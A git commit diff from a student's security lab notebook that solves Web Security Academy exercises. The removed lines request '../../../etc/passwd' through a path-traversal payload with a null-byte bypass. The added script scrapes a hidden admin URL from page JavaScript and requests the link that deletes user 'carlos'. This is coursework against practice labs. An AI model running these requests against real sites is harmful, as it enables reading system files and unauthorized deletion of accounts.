f385fd3176290b992c0856c17fdaa4a6984a51d4
Maksim Semchuk <semchuk2@pdx.edu>
2021-04-18 13:31:28 -0700

    completed 1.5 #4

--- Lab Notebook #1/Lab 1.5/Lab_1-5_Broken-access-control_1.py
+++ Lab Notebook #1/Lab 1.5/Lab_1-5_Broken-access-control_1.py
@@ -1,9 +1,22 @@
 import requests
+from bs4 import BeautifulSoup
 
 s = requests.session()
-site = 'acd81f591fd56934808c017d00b500e7.web-security-academy.net'
+site = 'ac621f1d1f4db79e819b291500640085.web-security-academy.net'
 
-url = f'''https://{site}/image?filename=../../../etc/passwd%00.png'''
-print(f'Trying URL:\n{url}\n\n')
+url = f'https://{site}'
 resp = s.get(url)
-print(resp.text)
+
+soup = BeautifulSoup(resp.text, 'html.parser')
+script = soup.find_all('script')[1].contents[0]
+match_line = [line for line in script.split('\n') if 'admin-' in line]
+uri = match_line[0].split("'")[3]
+
+url = f'https://{site}{uri}'
+resp = s.get(url)
+soup = BeautifulSoup(resp.text, 'html.parser')
+
+carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]
+
+delete_uri = carlos_delete_link[0]['href']
+s.get(f'https://{site}{delete_uri}')
